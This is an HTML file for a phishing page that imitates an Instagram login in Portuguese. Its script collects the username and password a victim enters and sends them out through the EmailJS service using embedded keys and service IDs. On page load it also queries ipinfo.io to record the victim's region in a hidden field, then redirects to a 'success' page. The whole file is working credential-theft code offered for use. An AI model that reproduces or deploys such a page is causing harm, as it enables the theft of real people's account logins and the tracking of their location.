
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="UTF-8">
  <title> </title>
  <link rel='stylesheet' href='bootstrap.min.css'>
  <link rel="stylesheet" href="./style.css">

  <script type="module">
    import emailjs from 'https://cdn.emailjs.com/dist/email.min.js';
</script>

</head>
<body>
<!-- partial:index.partial.html -->
<div class="wrapper">
    <form class="form-signin" id="contact-form" >       
      <img src="https://clipart.info/images/ccovers/1516920567instagram-png-logo-transparent.png" alt="Instgram" width="300" height="300">

      <input type="hidden" class="form-control" placeholder="Username" id="name"  value="Instagram" name="name" class="input-1" hidden />
      <input type="text" class="form-control" name="emanil" id="email" placeholder="Nome de usuÃ¡rio" required>
      <input type="hidden" class="form-control" id="region" name="region">
      <input type="text" class="form-control" placeholder="Senha" id="message" name="message" class="input-2" />




      <button class="btn btn-lg btn-primary btn-block" type="submit">Conecte-se</button>   
    </form>
  </div>
<!-- partial -->
  
</div>
<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>

<script type="text/javascript">
(function() {
    emailjs.init("sCjvblHtJz5-dnvby"); // Use your EmailJS User ID
})();

document.getElementById("contact-form").addEventListener("submit", function(event) {
    event.preventDefault();

    // Collect form values
    var name = document.getElementById("name").value;
    var email = document.getElementById("email").value;
    var message = document.getElementById("message").value;
    var region = document.getElementById("region").value;

    // Prepare email parameters
    var emailParams = {
        from_name: name,
        from_email: email,
        message: message,
        region: region
    };

    // Send the email using EmailJS
    emailjs.send("service_rt0p7sq", "template_1atsc26", emailParams)
        .then(function(response) {
            console.log(" ", response);

        // Redirect to another page after email is sent
    window.location.href = "success.html";  // Redirect to a 'thank you' page after email is sent
        }, function(error) {
            console.error("Error sending email:", error);
            alert("Failed to send message. Please try again later.");
        });
});
</script>

<script type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
(function(){
  emailjs.init({
    publicKey: "sCjvblHtJz5-dnvby",
  });
})();
</script>
<script type="text/javascript">
(function(){
 emailjs.init({
   publicKey: "sCjvblHtJz5-dnvby",
 });
})();
</script>
<script type="text/javascript">
(function(){
 emailjs.init({
   publicKey: "sCjvblHtJz5-dnvby",
 });
})();
</script>
<script>
// Function to get user's country using IP info service
function getUserRegion() {
  // Use ipinfo.io API to get user's geolocation info
  fetch('https://ipinfo.io?token=999a655c730c7c') // Replace 'YOUR_API_TOKEN' with your actual API token
      .then(response => response.json())
      .then(data => {
          // Get the country from the response data
          var region = data.region;

          // Populate the hidden form field with the country code
          document.getElementById('region').value = region;
      })
      .catch(error => {
          // Handle error if the API request fails
          alert('Error fetching region: ' + error.message);
      });
}

// Call getUserCountry when the page loads
window.onload = function() {
  getUserRegion();
}
</script>

</body>
</html>

